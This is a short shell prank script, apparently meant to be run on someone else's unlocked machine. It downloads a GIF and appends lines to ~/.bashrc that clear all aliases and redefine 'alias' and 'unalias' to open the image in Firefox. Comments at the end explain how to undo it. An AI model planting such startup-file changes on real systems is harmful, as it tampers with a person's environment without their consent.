# Creator : MrVyM
	
### Confloose ###
# Unalias 

cd 
curl https://media.tenor.com/4PihZhC7CTcAAAAC/non-nan.gif -o .nan.gif &>/dev/null
echo "unalias -a &>/dev/null" >> ~/.bashrc 
echo "unalias() { firefox ~/.nan.gif; }" >> ~/.bashrc 
echo "alias() { firefox ~/.nan.gif; }" >> ~/.bashrc 
echo "Unalias : End"
### Antidote ###

# Win+Enter
# vim ~/.bashrc
# Remove the line at the end of the file and save
